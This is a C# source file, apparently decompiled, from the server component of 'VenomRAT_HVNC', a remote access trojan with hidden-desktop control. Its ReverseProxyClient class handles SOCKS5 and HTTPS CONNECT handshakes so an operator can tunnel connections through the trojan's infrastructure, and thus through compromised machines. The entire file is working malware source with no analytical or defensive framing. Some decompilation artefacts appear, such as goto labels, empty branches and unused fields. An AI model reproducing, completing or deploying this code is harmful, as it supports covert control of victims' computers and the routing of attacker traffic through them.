using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Helper
{
    public class ReverseProxyClient
    {
        public Socket Handle { get; private set; }

        public Clients Client { get; private set; }

        public long PacketsReceived { get; private set; }

        public long PacketsSended { get; private set; }

        public long LengthReceived { get; private set; }

        public long LengthSent { get; private set; }

        public int ConnectionId
        {
            get
            {
                return this.Handle.Handle.ToInt32();
            }
        }

        public string TargetServer { get; private set; }

        public ushort TargetPort { get; private set; }

        public bool IsConnected { get; private set; }

        public ReverseProxyClient.ProxyType Type { get; private set; }

        public string HostName { get; private set; }

        public bool ProxySuccessful { get; private set; }

        public ReverseProxyClient(Clients client, Socket socket, ReverseProxyServer server)
        {
            this.Handle = socket;
            this.Client = client;
            this._handshakeStream = new MemoryStream();
            this._buffer = new byte[8192];
            this.IsConnected = true;
            this.TargetServer = "";
            this.Type = ReverseProxyClient.ProxyType.Unknown;
            this.Server = server;
            try
            {
                socket.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
            }
            catch
            {
                this.Disconnect();
            }
        }

        private void AsyncReceive(IAsyncResult ar)
        {
            try
            {
                int num = this.Handle.EndReceive(ar);
                if (num <= 0)
                {
                    this.Disconnect();
                    return;
                }
                if (num > 5000 || this._handshakeStream.Length + (long)num > 5000L)
                {
                    this.Disconnect();
                    return;
                }
                this.LengthReceived += (long)num;
                this._handshakeStream.Write(this._buffer, 0, num);
            }
            catch
            {
                this.Disconnect();
                return;
            }
            byte[] array = this._handshakeStream.ToArray();
            long packetsReceived = this.PacketsReceived;
            if (packetsReceived != 0L)
            {
                if (packetsReceived == 1L)
                {
                    int num2 = 6;
                    if (array.Length >= num2)
                    {
                        if (!this.CheckProxyVersion(array))
                        {
                            return;
                        }
                        this._isConnectCommand = array[1] == 1;
                        this._isBindCommand = array[1] == 2;
                        this._isUdpCommand = array[1] == 3;
                        this._isIpType = array[3] == 1;
                        this._isDomainNameType = array[3] == 3;
                        this._isIPv6NameType = array[3] == 4;
                        Array.Reverse(array, array.Length - 2, 2);
                        this.TargetPort = BitConverter.ToUInt16(array, array.Length - 2);
                        if (this._isConnectCommand)
                        {
                            if (this._isIpType)
                            {
                                this.TargetServer = string.Concat(new string[]
                                {
                                    array[4].ToString(),
                                    ".",
                                    array[5].ToString(),
                                    ".",
                                    array[6].ToString(),
                                    ".",
                                    array[7].ToString()
                                });
                            }
                            else if (this._isDomainNameType)
                            {
                                int num3 = (int)array[4];
                                if (num2 + num3 < array.Length)
                                {
                                    this.TargetServer = Encoding.ASCII.GetString(array, 5, num3);
                                }
                            }
                            if (this.TargetServer.Length > 0)
                            {
                            }
                            this.Server.CallonUpdateConnection(this);
                            return;
                        }
                        this.SendFailToClient();
                        return;
                    }
                }
            }
            else if (array.Length >= 3)
            {
                string @string = Encoding.ASCII.GetString(array);
                if (array[0] == 5)
                {
                    this.Type = ReverseProxyClient.ProxyType.SOCKS5;
                }
                else
                {
                    if (!@string.StartsWith("CONNECT") || !@string.Contains(":"))
                    {
                        goto IL_31F;
                    }
                    this.Type = ReverseProxyClient.ProxyType.HTTPS;
                    using (StreamReader streamReader = new StreamReader(new MemoryStream(array)))
                    {
                        string text = streamReader.ReadLine();
                        if (text == null)
                        {
                            goto IL_31F;
                        }
                        string[] array2 = text.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                        if (array2.Length != 0)
                        {
                            try
                            {
                                string text2 = array2[1];
                                this.TargetServer = text2.Split(new char[] { ':' })[0];
                                this.TargetPort = ushort.Parse(text2.Split(new char[] { ':' })[1]);
                                this._isConnectCommand = true;
                                this._isDomainNameType = true;
                                this.Server.CallonConnectionEstablished(this);
                                return;
                            }
                            catch
                            {
                                this.Disconnect();
                            }
                        }
                    }
                }
                if (this.CheckProxyVersion(array))
                {
                    this.SendSuccessToClient();
                    long packetsReceived2 = this.PacketsReceived;
                    this.PacketsReceived = packetsReceived2 + 1L;
                    this._handshakeStream.SetLength(0L);
                    this.Server.CallonConnectionEstablished(this);
                }
            }
        IL_31F:
            try
            {
                this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceive), null);
            }
            catch
            {
                this.Disconnect();
            }
        }

        public void Disconnect()
        {
            if (!this._disconnectIsSend)
            {
                this._disconnectIsSend = true;
            }
            try
            {
                this.Handle.Close();
            }
            catch
            {
            }
            this.IsConnected = false;
            this.Server.CallonUpdateConnection(this);
        }

        public void SendToClient(byte[] payload)
        {
            Socket handle = this.Handle;
            lock (handle)
            {
                try
                {
                    this.LengthSent += (long)payload.Length;
                    this.Handle.Send(payload);
                }
                catch
                {
                    this.Disconnect();
                }
            }
            this.Server.CallonUpdateConnection(this);
        }

        private void SendFailToClient()
        {
            if (this.Type == ReverseProxyClient.ProxyType.HTTPS)
            {
                this.Disconnect();
            }
            if (this.Type == ReverseProxyClient.ProxyType.SOCKS5)
            {
                this.SendToClient(new byte[] { 5, byte.MaxValue });
                this.Disconnect();
            }
        }

        private void SendSuccessToClient()
        {
            if (this.Type == ReverseProxyClient.ProxyType.SOCKS5)
            {
                byte[] array = new byte[2];
                array[0] = 5;
                this.SendToClient(array);
            }
        }

        private bool CheckProxyVersion(byte[] payload)
        {
            if (this.Type == ReverseProxyClient.ProxyType.HTTPS)
            {
                return true;
            }
            if (payload.Length != 0 && payload[0] != 5)
            {
                this.SendFailToClient();
                this.Disconnect();
                return false;
            }
            return true;
        }

        private void AsyncReceiveProxy(IAsyncResult ar)
        {
            long num2;
            try
            {
                int num = this.Handle.EndReceive(ar);
                if (num <= 0)
                {
                    this.Disconnect();
                    return;
                }
                this.LengthReceived += (long)num;
                byte[] array = new byte[num];
                Array.Copy(this._buffer, array, num);
                this.LengthSent += (long)array.Length;
                num2 = this.PacketsSended;
                this.PacketsSended = num2 + 1L;
            }
            catch
            {
                this.Disconnect();
                return;
            }
            num2 = this.PacketsReceived;
            this.PacketsReceived = num2 + 1L;
            this.Server.CallonUpdateConnection(this);
            try
            {
                this.Handle.BeginReceive(this._buffer, 0, this._buffer.Length, SocketFlags.None, new AsyncCallback(this.AsyncReceiveProxy), null);
            }
            catch
            {
            }
        }

        public const int SOCKS5_DEFAULT_PORT = 3218;

        public const byte SOCKS5_VERSION_NUMBER = 5;

        public const byte SOCKS5_RESERVED = 0;

        public const byte SOCKS5_AUTH_NUMBER_OF_AUTH_METHODS_SUPPORTED = 2;

        public const byte SOCKS5_AUTH_METHOD_NO_AUTHENTICATION_REQUIRED = 0;

        public const byte SOCKS5_AUTH_METHOD_GSSAPI = 1;

        public const byte SOCKS5_AUTH_METHOD_USERNAME_PASSWORD = 2;

        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_BEGIN = 3;

        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_END = 127;

        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_BEGIN = 128;

        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_END = 254;

        public const byte SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS = 255;

        public const byte SOCKS5_CMD_REPLY_SUCCEEDED = 0;

        public const byte SOCKS5_CMD_REPLY_GENERAL_SOCKS_SERVER_FAILURE = 1;

        public const byte SOCKS5_CMD_REPLY_CONNECTION_NOT_ALLOWED_BY_RULESET = 2;

        public const byte SOCKS5_CMD_REPLY_NETWORK_UNREACHABLE = 3;

        public const byte SOCKS5_CMD_REPLY_HOST_UNREACHABLE = 4;

        public const byte SOCKS5_CMD_REPLY_CONNECTION_REFUSED = 5;

        public const byte SOCKS5_CMD_REPLY_TTL_EXPIRED = 6;

        public const byte SOCKS5_CMD_REPLY_COMMAND_NOT_SUPPORTED = 7;

        public const byte SOCKS5_CMD_REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8;

        public const byte SOCKS5_ADDRTYPE_IPV4 = 1;

        public const byte SOCKS5_ADDRTYPE_DOMAIN_NAME = 3;

        public const byte SOCKS5_ADDRTYPE_IPV6 = 4;

        public const int BUFFER_SIZE = 8192;

        private bool _receivedConnResponse;

        private MemoryStream _handshakeStream;

        private byte[] _buffer;

        private bool _isBindCommand;

        private bool _isUdpCommand;

        private bool _isConnectCommand;

        private bool _isIpType;

        private bool _isIPv6NameType;

        private bool _isDomainNameType;

        private bool _disconnectIsSend;

        private ReverseProxyServer Server;

        public enum ProxyType
        {
            Unknown,

            SOCKS5,

            HTTPS
        }
    }
}
